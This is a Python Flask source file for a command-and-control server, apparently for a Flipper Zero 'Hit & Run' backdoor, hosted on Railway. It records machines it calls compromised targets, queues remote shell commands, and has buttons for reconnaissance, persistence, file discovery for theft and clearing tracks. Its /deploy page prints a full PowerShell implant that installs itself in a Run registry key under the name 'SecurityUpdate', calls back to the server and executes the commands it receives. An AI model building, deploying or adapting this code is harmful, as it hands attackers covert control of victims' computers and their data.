
# === app.py ===
#!/usr/bin/env python3
"""
Hit & Run C2 Server - Railway Optimized
Ultra-fast deployment for global backdoor access
"""

import os
import sqlite3
import json
import datetime
from threading import Lock
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'railway-c2-secret-2024')

# Thread-safe database
db_lock = Lock()
DATABASE_FILE = 'railway_c2.db'

# API Key für Sicherheit
API_KEY = os.environ.get('API_KEY', 'hitrun2024')

def init_database():
    """Initialize SQLite database optimized for Railway"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        # Sessions table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hostname TEXT UNIQUE NOT NULL,
                username TEXT NOT NULL,
                ip_address TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                os_info TEXT,
                admin_status BOOLEAN DEFAULT FALSE,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Commands table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_hostname TEXT NOT NULL,
                command TEXT NOT NULL,
                executed BOOLEAN DEFAULT FALSE,
                result TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                FOREIGN KEY (session_hostname) REFERENCES sessions (hostname)
            )
        ''')
        
        # Results table for better performance
        conn.execute('''
            CREATE TABLE IF NOT EXISTS command_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_hostname TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                execution_time REAL,
                success BOOLEAN DEFAULT TRUE,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Create indexes for better performance
        conn.execute('CREATE INDEX IF NOT EXISTS idx_sessions_hostname ON sessions(hostname)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_commands_session ON commands(session_hostname)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_commands_executed ON commands(executed)')

# =============================================================================
# CORE BACKDOOR API - Ultra optimized for Railway
# =============================================================================

@app.route('/b', methods=['POST'])
def beacon():
    """Main beacon endpoint - targets check in here"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid request'}), 400
        
        hostname = data.get('h', 'unknown')
        username = data.get('u', 'unknown')
        admin_status = data.get('a', False)
        os_info = data.get('os', 'Unknown')
        
        # Get real IP (Railway handles X-Forwarded-For)
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        current_time = datetime.datetime.now()
        
        # Update or create session
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('''
                    INSERT OR REPLACE INTO sessions 
                    (hostname, username, ip_address, last_seen, os_info, admin_status, status)
                    VALUES (?, ?, ?, ?, ?, ?, 'active')
                ''', (hostname, username, ip_address, current_time, os_info, admin_status))
        
        # Get pending commands
        pending_commands = get_pending_commands(hostname)
        
        # Log beacon (optional - disable in production for stealth)
        print(f"[BEACON] {hostname} ({username}) from {ip_address} - Admin: {admin_status}")
        
        return jsonify({
            'c': pending_commands,
            'status': 'ok',
            'server_time': current_time.isoformat()
        })
        
    except Exception as e:
        print(f"Beacon error: {e}")
        return jsonify({'error': 'Server error'}), 500

@app.route('/r', methods=['POST'])
def result():
    """Command result endpoint"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid request'}), 400
        
        hostname = data.get('h', 'unknown')
        command = data.get('c', '')
        output = data.get('o', '')
        execution_time = data.get('t', 0)
        success = data.get('s', True)
        
        current_time = datetime.datetime.now()
        
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Store detailed result
                conn.execute('''
                    INSERT INTO command_results 
                    (session_hostname, command, output, execution_time, success, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (hostname, command, output[:5000], execution_time, success, current_time))  # Limit output size
                
                # Mark command as executed
                conn.execute('''
                    UPDATE commands 
                    SET executed = TRUE, result = ?, executed_at = ?
                    WHERE session_hostname = ? AND command = ? AND executed = FALSE
                ''', (output[:1000], current_time, hostname, command))
        
        print(f"[RESULT] {hostname}: {command[:30]}... ({len(output)} chars)")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"Result error: {e}")
        return jsonify({'error': 'Server error'}), 500

@app.route('/test')
def health_check():
    """Health check endpoint for Railway"""
    return jsonify({
        'status': 'online',
        'server': 'Railway C2',
        'version': '3.0',
        'timestamp': datetime.datetime.now().isoformat()
    })

def get_pending_commands(hostname):
    """Get pending commands for a session"""
    with db_lock:
        with sqlite3.connect(DATABASE_FILE) as conn:
            cursor = conn.execute('''
                SELECT command FROM commands 
                WHERE session_hostname = ? AND executed = FALSE
                ORDER BY created_at ASC LIMIT 10
            ''', (hostname,))
            return [row[0] for row in cursor.fetchall()]

# =============================================================================
# WEB DASHBOARD - Railway Optimized
# =============================================================================

@app.route('/')
def dashboard():
    """Main C2 dashboard - works on any device"""
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 Railway C2 Control Center</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
            color: #00ff41; 
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container { 
            max-width: 1400px; 
            margin: 0 auto; 
            padding: 15px; 
        }
        
        .header { 
            text-align: center; 
            border: 2px solid #00ff41; 
            padding: 20px; 
            margin-bottom: 20px;
            background: rgba(0, 255, 65, 0.1);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
            border-radius: 8px;
        }
        
        .header h1 {
            font-size: 2.2em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff41;
        }
        
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 15px; 
            margin-bottom: 20px; 
        }
        
        .stat-card { 
            border: 1px solid #00ff41; 
            padding: 15px; 
            text-align: center;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            background: rgba(0, 255, 65, 0.1);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #00ff41;
            text-shadow: 0 0 5px #00ff41;
        }
        
        .sessions-container { 
            border: 2px solid #00ff41; 
            padding: 20px; 
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 8px;
        }
        
        .session { 
            border: 1px solid #333; 
            margin: 8px 0; 
            padding: 15px;
            background: rgba(0, 255, 65, 0.05);
            cursor: pointer;
            transition: all 0.3s ease;
            border-radius: 4px;
        }
        
        .session:hover { 
            background: rgba(0, 255, 65, 0.15); 
            border-color: #00ff41;
            transform: translateX(5px);
        }
        
        .session.active { 
            border-color: #00ff41; 
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }
        
        .controls { 
            display: grid; 
            grid-template-columns: 1fr 1fr; 
            gap: 20px; 
            margin-bottom: 20px;
        }
        
        .control-panel { 
            border: 2px solid #00ff41; 
            padding: 20px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 8px;
        }
        
        .control-panel h3 {
            margin-bottom: 15px;
            text-align: center;
            color: #00ff41;
            text-shadow: 0 0 5px #00ff41;
        }
        
        input, textarea, select { 
            background: rgba(0, 0, 0, 0.8); 
            color: #00ff41; 
            border: 1px solid #00ff41; 
            padding: 10px; 
            width: 100%; 
            margin: 8px 0;
            font-family: 'Courier New', monospace;
            border-radius: 4px;
            transition: all 0.3s ease;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #00ff41;
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }
        
        button { 
            background: linear-gradient(135deg, #001a00, #003300); 
            color: #00ff41; 
            border: 1px solid #00ff41; 
            padding: 10px 15px; 
            cursor: pointer; 
            margin: 4px;
            font-family: 'Courier New', monospace;
            border-radius: 4px;
            transition: all 0.3s ease;
            font-weight: bold;
        }
        
        button:hover { 
            background: linear-gradient(135deg, #00ff41, #00cc33); 
            color: #000; 
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 255, 65, 0.3);
        }
        
        .output { 
            background: rgba(0, 0, 0, 0.9); 
            border: 2px solid #00ff41; 
            padding: 15px; 
            height: 300px; 
            overflow-y: auto; 
            white-space: pre-wrap;
            font-size: 12px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
        }
        
        .status-online { color: #00ff41; font-weight: bold; }
        .status-offline { color: #ff4444; font-weight: bold; }
        .admin-badge { color: #ffaa00; font-weight: bold; }
        
        @media (max-width: 768px) {
            .controls { grid-template-columns: 1fr; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .header h1 { font-size: 1.8em; }
        }
        
        @media (max-width: 480px) {
            .stats { grid-template-columns: 1fr; }
            .container { padding: 10px; }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        .server-info {
            text-align: center;
            margin-top: 10px;
            font-size: 0.9em;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔴 RAILWAY C2 CONTROL CENTER</h1>
            <p>Global Internet Backdoor Management System</p>
            <p>Hit & Run Deployment • Cross-Platform Access • Real-time Control</p>
            <div class="server-info">
                Server: <span id="serverUrl">{{ request.host }}</span> | 
                Status: <span class="status-online pulse">ONLINE</span>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h4>Active Sessions</h4>
                <div class="stat-value" id="activeCount">0</div>
            </div>
            <div class="stat-card">
                <h4>Total Compromised</h4>
                <div class="stat-value" id="totalCount">0</div>
            </div>
            <div class="stat-card">
                <h4>Commands Executed</h4>
                <div class="stat-value" id="commandCount">0</div>
            </div>
            <div class="stat-card">
                <h4>Admin Access</h4>
                <div class="stat-value" id="adminCount">0</div>
            </div>
        </div>
        
        <div class="sessions-container">
            <h2>💻 Compromised Targets</h2>
            <div id="sessionList">
                <div style="text-align: center; padding: 40px; opacity: 0.7;">
                    <p>🎯 No active sessions detected</p>
                    <p>Deploy Hit & Run payload to begin compromise</p>
                    <p><em>Targets will appear here automatically</em></p>
                </div>
            </div>
        </div>
        
        <div class="controls">
            <div class="control-panel">
                <h3>📡 Command Execution</h3>
                <select id="targetSession">
                    <option value="">🎯 Select Target Session</option>
                </select>
                <textarea id="commandInput" placeholder="Enter command to execute on target..." rows="3"></textarea>
                <div style="text-align: center;">
                    <button onclick="executeCommand()">🚀 Execute Command</button>
                </div>
                <div style="margin-top: 10px;">
                    <button onclick="quickCommand('whoami')">👤 User Info</button>
                    <button onclick="quickCommand('hostname && echo %USERNAME%')">🖥️ System</button>
                    <button onclick="quickCommand('ipconfig | findstr IPv4')">🌐 Network</button>
                </div>
            </div>
            
            <div class="control-panel">
                <h3>🛠️ Quick Actions</h3>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
                    <button onclick="systemInfo()">📊 System Info</button>
                    <button onclick="networkInfo()">🔍 Network Scan</button>
                    <button onclick="processInfo()">⚙️ Processes</button>
                    <button onclick="userInfo()">👥 Users</button>
                    <button onclick="securityInfo()">🔒 Security</button>
                    <button onclick="persistence()">♾️ Persistence</button>
                    <button onclick="exfiltrate()">📤 Exfiltrate</button>
                    <button onclick="cleanup()">🧹 Clean</button>
                </div>
            </div>
        </div>
        
        <div class="control-panel">
            <h3>📟 Command Output & Logs</h3>
            <div id="output" class="output">🚀 Railway C2 Server Ready
📡 Waiting for targets to connect...
💡 Deploy Flipper Zero Hit & Run payload to begin

Server Status: ONLINE
Time: {{ moment().format('YYYY-MM-DD HH:mm:ss') }}
</div>
            <div style="text-align: center; margin-top: 10px;">
                <button onclick="clearOutput()">🗑️ Clear Output</button>
                <button onclick="refreshData()">🔄 Refresh</button>
                <button onclick="downloadLogs()">💾 Download Logs</button>
                <button onclick="exportSessions()">📋 Export Sessions</button>
            </div>
        </div>
    </div>

    <script>
        let selectedSession = '';
        let commandHistory = [];
        
        // Auto-refresh data every 10 seconds
        setInterval(refreshData, 10000);
        refreshData(); // Initial load
        
        function refreshData() {
            updateSessions();
            updateStats();
        }
        
        function updateSessions() {
            fetch('/api/sessions')
                .then(response => response.json())
                .then(data => {
                    displaySessions(data.sessions || []);
                    updateSessionSelect(data.sessions || []);
                })
                .catch(error => {
                    addOutput('❌ Error fetching sessions: ' + error.message);
                });
        }
        
        function updateStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('activeCount').textContent = data.active_sessions || 0;
                    document.getElementById('totalCount').textContent = data.total_sessions || 0;
                    document.getElementById('commandCount').textContent = data.total_commands || 0;
                    document.getElementById('adminCount').textContent = data.admin_sessions || 0;
                })
                .catch(error => console.error('Stats update failed:', error));
        }
        
        function displaySessions(sessions) {
            const container = document.getElementById('sessionList');
            
            if (sessions.length === 0) {
                container.innerHTML = `
                    <div style="text-align: center; padding: 40px; opacity: 0.7;">
                        <p>🎯 No active sessions detected</p>
                        <p>Deploy Hit & Run payload to begin compromise</p>
                        <p><em>Targets will appear here automatically</em></p>
                    </div>
                `;
                return;
            }
            
            let html = '';
            sessions.forEach(session => {
                const lastSeen = new Date(session.last_seen);
                const isActive = (Date.now() - lastSeen.getTime()) < 300000; // 5 minutes
                const statusClass = isActive ? 'status-online' : 'status-offline';
                const status = isActive ? 'ONLINE' : 'OFFLINE';
                const adminBadge = session.admin_status ? ' <span class="admin-badge">[ADMIN]</span>' : '';
                
                html += `
                    <div class="session ${isActive ? 'active' : ''}" onclick="selectSession('${session.hostname}')">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <strong>🖥️ ${session.hostname}</strong>${adminBadge}
                                <span class="${statusClass}"> • ${status}</span>
                            </div>
                            <div style="text-align: right; font-size: 0.9em;">
                                ${session.os_info || 'Unknown OS'}
                            </div>
                        </div>
                        <div style="margin-top: 8px; font-size: 0.9em; opacity: 0.9;">
                            👤 User: ${session.username} | 
                            🌐 IP: ${session.ip_address} | 
                            ⏰ Last: ${lastSeen.toLocaleTimeString()}
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        function updateSessionSelect(sessions) {
            const select = document.getElementById('targetSession');
            let options = '<option value="">🎯 Select Target Session</option>';
            
            sessions.forEach(session => {
                const lastSeen = new Date(session.last_seen);
                const isActive = (Date.now() - lastSeen.getTime()) < 300000;
                
                if (isActive) {
                    const adminText = session.admin_status ? ' [ADMIN]' : '';
                    options += `<option value="${session.hostname}">${session.hostname} (${session.username})${adminText}</option>`;
                }
            });
            
            select.innerHTML = options;
            
            // Restore selection if it still exists
            if (selectedSession) {
                select.value = selectedSession;
            }
        }
        
        function selectSession(hostname) {
            selectedSession = hostname;
            document.getElementById('targetSession').value = hostname;
            addOutput(`🎯 Selected target: ${hostname}`);
        }
        
        function executeCommand() {
            const session = document.getElementById('targetSession').value;
            const command = document.getElementById('commandInput').value.trim();
            
            if (!session) {
                addOutput('❌ Error: Please select a target session');
                return;
            }
            
            if (!command) {
                addOutput('❌ Error: Please enter a command');
                return;
            }
            
            addOutput(`📤 Executing on ${session}: ${command}`);
            
            fetch('/api/execute', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session: session,
                    command: command,
                    api_key: 'hitrun2024'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    addOutput(`❌ Error: ${data.error}`);
                } else {
                    addOutput(`✅ ${data.message || 'Command queued successfully'}`);
                    document.getElementById('commandInput').value = '';
                    
                    // Check for result after 3 seconds
                    setTimeout(() => checkResult(session, command), 3000);
                }
            })
            .catch(error => {
                addOutput(`❌ Network error: ${error.message}`);
            });
        }
        
        function quickCommand(cmd) {
            document.getElementById('commandInput').value = cmd;
            executeCommand();
        }
        
        function checkResult(session, command) {
            fetch(`/api/result/${encodeURIComponent(session)}/${encodeURIComponent(command)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.result) {
                        addOutput(`📋 Result from ${session}:\n${data.result}\n`);
                    } else {
                        addOutput(`⏳ No result yet from ${session} (command may still be executing)`);
                    }
                })
                .catch(error => {
                    console.error('Result check failed:', error);
                });
        }
        
        // Quick action functions
        function systemInfo() {
            quickCommand('systeminfo | findstr /C:"OS Name" /C:"Total Physical Memory" /C:"System Type"');
        }
        
        function networkInfo() {
            quickCommand('ipconfig /all && arp -a');
        }
        
        function processInfo() {
            quickCommand('tasklist | findstr /C:"explorer" /C:"chrome" /C:"firefox"');
        }
        
        function userInfo() {
            quickCommand('net user && net localgroup administrators');
        }
        
        function securityInfo() {
            quickCommand('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname');
        }
        
        function persistence() {
            quickCommand('reg query "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" && schtasks /query /tn "SecurityUpdateService"');
        }
        
        function exfiltrate() {
            quickCommand('dir /s /b c:\\\\users\\\\*.txt | findstr /v "AppData" | head -20');
        }
        
        function cleanup() {
            quickCommand('powershell -c "Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; echo \\'Tracks cleaned\\'"');
        }
        
        function addOutput(text) {
            const output = document.getElementById('output');
            const timestamp = new Date().toLocaleTimeString();
            output.textContent += `[${timestamp}] ${text}\n`;
            output.scrollTop = output.scrollHeight;
        }
        
        function clearOutput() {
            document.getElementById('output').textContent = '🚀 Railway C2 Server Ready\n📡 Output cleared - waiting for commands...\n\n';
        }
        
        function downloadLogs() {
            const logs = document.getElementById('output').textContent;
            const blob = new Blob([logs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `c2_logs_${new Date().toISOString().slice(0, 10)}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            addOutput('💾 Logs downloaded successfully');
        }
        
        function exportSessions() {
            fetch('/api/sessions')
                .then(response => response.json())
                .then(data => {
                    const csv = convertToCSV(data.sessions);
                    const blob = new Blob([csv], { type: 'text/csv' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `sessions_${new Date().toISOString().slice(0, 10)}.csv`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    addOutput('📋 Sessions exported to CSV');
                });
        }
        
        function convertToCSV(sessions) {
            const headers = ['Hostname', 'Username', 'IP Address', 'OS Info', 'Admin', 'First Seen', 'Last Seen'];
            const rows = sessions.map(s => [
                s.hostname, s.username, s.ip_address, s.os_info || 'Unknown', 
                s.admin_status ? 'Yes' : 'No', s.first_seen, s.last_seen
            ]);
            
            return [headers, ...rows].map(row => 
                row.map(field => `"${field}"`).join(',')
            ).join('\\n');
        }
        
        // Initialize
        addOutput('🌍 Railway C2 Server initialized');
        addOutput('📡 Ready to receive target connections');
        addOutput('💡 Deploy Hit & Run payload to begin compromise');
    </script>
</body>
</html>
    ''')

# =============================================================================
# API ENDPOINTS FOR DASHBOARD
# =============================================================================

@app.route('/api/sessions')
def api_sessions():
    """Get all sessions with detailed information"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                cursor = conn.execute('''
                    SELECT hostname, username, ip_address, os_info, admin_status, 
                           first_seen, last_seen, status
                    FROM sessions 
                    ORDER BY last_seen DESC
                ''')
                
                sessions = []
                for row in cursor.fetchall():
                    sessions.append({
                        'hostname': row[0],
                        'username': row[1],
                        'ip_address': row[2],
                        'os_info': row[3],
                        'admin_status': bool(row[4]),
                        'first_seen': row[5],
                        'last_seen': row[6],
                        'status': row[7]
                    })
        
        return jsonify({'sessions': sessions})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def api_stats():
    """Get dashboard statistics"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Active sessions (last 5 minutes)
                active_cursor = conn.execute('''
                    SELECT COUNT(*) FROM sessions 
                    WHERE datetime(last_seen) > datetime('now', '-5 minutes')
                ''')
                active_sessions = active_cursor.fetchone()[0]
                
                # Total sessions
                total_cursor = conn.execute('SELECT COUNT(*) FROM sessions')
                total_sessions = total_cursor.fetchone()[0]
                
                # Admin sessions
                admin_cursor = conn.execute('''
                    SELECT COUNT(*) FROM sessions 
                    WHERE admin_status = 1 AND datetime(last_seen) > datetime('now', '-5 minutes')
                ''')
                admin_sessions = admin_cursor.fetchone()[0]
                
                # Total commands
                cmd_cursor = conn.execute('SELECT COUNT(*) FROM commands')
                total_commands = cmd_cursor.fetchone()[0]
        
        return jsonify({
            'active_sessions': active_sessions,
            'total_sessions': total_sessions,
            'admin_sessions': admin_sessions,
            'total_commands': total_commands
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/execute', methods=['POST'])
def api_execute():
    """Queue command for execution"""
    try:
        data = request.get_json()
        
        # Simple API key check
        if data.get('api_key') != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        
        session = data.get('session', '').strip()
        command = data.get('command', '').strip()
        
        if not session or not command:
            return jsonify({'error': 'Session and command required'}), 400
        
        # Add command to queue
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('''
                    INSERT INTO commands (session_hostname, command, executed)
                    VALUES (?, ?, FALSE)
                ''', (session, command))
        
        print(f"[COMMAND] Queued for {session}: {command}")
        
        return jsonify({'message': f'Command queued for execution on {session}'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/result/<session>/<path:command>')
def api_get_result(session, command):
    """Get result of executed command"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                cursor = conn.execute('''
                    SELECT output, execution_time, success, timestamp 
                    FROM command_results
                    WHERE session_hostname = ? AND command = ?
                    ORDER BY timestamp DESC LIMIT 1
                ''', (session, command))
                
                result = cursor.fetchone()
                if result:
                    return jsonify({
                        'result': result[0],
                        'execution_time': result[1],
                        'success': result[2],
                        'timestamp': result[3]
                    })
                else:
                    return jsonify({'result': None})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =============================================================================
# DEPLOYMENT HELPER
# =============================================================================

@app.route('/deploy')
def deploy_instructions():
    """Show deployment instructions for Flipper Zero"""
    base_url = request.url_root.rstrip('/')
    
    instructions = f'''
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Railway C2 Deployment Instructions</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
        .container {{ max-width: 1000px; margin: 0 auto; }}
        .code {{ background: #1a1a1a; border: 1px solid #00ff41; padding: 15px; margin: 10px 0; }}
        .highlight {{ color: #ffaa00; font-weight: bold; }}
        h1, h2 {{ color: #00ff41; text-shadow: 0 0 5px #00ff41; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Railway C2 Server Deployment Complete!</h1>
        
        <h2>📡 Server Information</h2>
        <div class="code">
            <strong>Server URL:</strong> <span class="highlight">{base_url}</span><br>
            <strong>API Endpoint:</strong> {base_url}/b<br>
            <strong>Dashboard:</strong> <a href="{base_url}" style="color: #00ff41;">{base_url}</a><br>
            <strong>Status:</strong> <span style="color: #00ff41;">ONLINE</span>
        </div>
        
        <h2>🔧 Flipper Zero Configuration</h2>
        <p>Update your Flipper Zero code with this server URL:</p>
        <div class="code">
            <strong>File:</strong> hit_run_backdoor_i.h<br><br>
            <span style="color: #888;">// Change this line:</span><br>
            #define INTERNET_C2_SERVER "<span class="highlight">{base_url}</span>"
        </div>
        
        <h2>💉 Manual PowerShell Payload</h2>
        <p>For manual deployment or testing:</p>
        <div class="code" style="font-size: 12px; word-break: break-all;">
$s='{base_url}';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$p="$env:APPDATA\\SecurityUpdate.ps1";$c='while(1){{try{{$d=@{{h=$h;u=$u;a=([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator");os=(Get-WmiObject -Class Win32_OperatingSystem).Caption}};$r=irm $s/b -m post -b($d|ConvertTo-Json) -ContentType "application/json";$r.c|%{{if($_){{$o=iex $_ 2>&1|out-string;irm $s/r -m post -b(@{{h=$h;c=$_;o=$o;t=0;s=$true}}|ConvertTo-Json) -ContentType "application/json"}}}}}}catch{{sleep 30}}}}';$c|out-file $p;reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /d "powershell -w hidden -f $p" /f;$c|iex
        </div>
        
        <h2>✅ Testing</h2>
        <div class="code">
            <strong>Health Check:</strong> <a href="{base_url}/test" style="color: #00ff41;">{base_url}/test</a><br>
            <strong>Dashboard:</strong> <a href="{base_url}" style="color: #00ff41;">{base_url}</a><br>
            <strong>Expected Response:</strong> {{"status": "online", "server": "Railway C2"}}
        </div>
        
        <h2>🔒 Security Notes</h2>
        <ul>
            <li>✅ HTTPS automatically enabled by Railway</li>
            <li>✅ API key protection: hitrun2024</li>
            <li>✅ Real IP detection via X-Forwarded-For</li>
            <li>✅ SQLite database with session persistence</li>
            <li>⚠️ Change API_KEY environment variable for production</li>
        </ul>
        
        <h2>🚀 Next Steps</h2>
        <ol>
            <li>Update Flipper Zero code with the server URL above</li>
            <li>Compile and install updated Flipper app</li>
            <li>Deploy Hit & Run payload on target</li>
            <li>Monitor targets via web dashboard</li>
            <li>Execute commands remotely from anywhere</li>
        </ol>
        
        <p style="text-align: center; margin-top: 40px;">
            <a href="{base_url}" style="color: #00ff41; text-decoration: none; font-size: 18px;">
                🎯 Open C2 Dashboard →
            </a>
        </p>
    </div>
</body>
</html>
    '''
    
    return instructions

# =============================================================================
# ADMIN ENDPOINTS
# =============================================================================

@app.route('/admin/cleanup', methods=['POST'])
def admin_cleanup():
    """Clean old data"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Remove old sessions (7 days)
                conn.execute('''
                    DELETE FROM sessions 
                    WHERE datetime(last_seen) < datetime('now', '-7 days')
                ''')
                
                # Remove old commands (24 hours)
                conn.execute('''
                    DELETE FROM commands 
                    WHERE executed = TRUE AND datetime(created_at) < datetime('now', '-1 day')
                ''')
                
                # Remove old results (3 days)
                conn.execute('''
                    DELETE FROM command_results 
                    WHERE datetime(timestamp) < datetime('now', '-3 days')
                ''')
        
        return jsonify({'message': 'Cleanup completed successfully'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/admin/stats')
def admin_stats():
    """Detailed admin statistics"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                stats = {}
                
                # Database size
                cursor = conn.execute("SELECT page_count * page_size as size FROM pragma_page_count(), pragma_page_size()")
                stats['db_size_bytes'] = cursor.fetchone()[0]
                
                # Table counts
                stats['sessions_count'] = conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
                stats['commands_count'] = conn.execute("SELECT COUNT(*) FROM commands").fetchone()[0]
                stats['results_count'] = conn.execute("SELECT COUNT(*) FROM command_results").fetchone()[0]
                
                # Recent activity
                stats['commands_last_hour'] = conn.execute('''
                    SELECT COUNT(*) FROM commands 
                    WHERE datetime(created_at) > datetime('now', '-1 hour')
                ''').fetchone()[0]
        
        return jsonify(stats)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =============================================================================
# ERROR HANDLERS
# =============================================================================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

# =============================================================================
# MAIN APPLICATION STARTUP
# =============================================================================

if __name__ == '__main__':
    # Initialize database
    init_database()
    
    # Get port from environment (Railway sets this)
    port = int(os.environ.get('PORT', 5000))
    
    print("🚀 Railway C2 Server Starting...")
    print(f"🌍 Server will be available at: https://your-app.railway.app")
    print(f"📊 Dashboard: https://your-app.railway.app")
    print(f"📡 API Endpoint: https://your-app.railway.app/b")
    print("=" * 60)
    
    # Run with gunicorn in production, Flask dev server locally
    if os.environ.get('RAILWAY_ENVIRONMENT'):
        # Production mode on Railway
        app.run(host='0.0.0.0', port=port, debug=False)
    else:
        # Development mode
        app.run(host='0.0.0.0', port=port, debug=True)

# =============================================================================
# DEPLOYMENT NOTES FOR RAILWAY
# =============================================================================

"""
Railway Deployment Checklist:

1. Create GitHub repository with these files:
   - app.py (this file)
   - requirements.txt
   - railway.json
   - README.md (optional)

2. Connect to Railway:
   - Go to railway.app
   - "Deploy from GitHub"
   - Select your repository
   - Railway auto-detects Python and deploys

3. Environment Variables (optional):
   - SECRET_KEY=your-secret-key-here
   - API_KEY=your-custom-api-key

4. Custom Domain (optional):
   - Railway provides: your-app.railway.app
   - Can add custom domain in settings

5. Monitoring:
   - Railway provides built-in logs
   - Metrics and usage tracking
   - Automatic HTTPS

6. Scaling:
   - Automatic scaling based on usage
   - $5 free credits = ~500 hours of runtime
   - Pay-as-you-go after free tier

This C2 server is optimized for Railway's infrastructure
and provides a robust, scalable platform for global
backdoor management with the Flipper Zero Hit & Run system.
"""
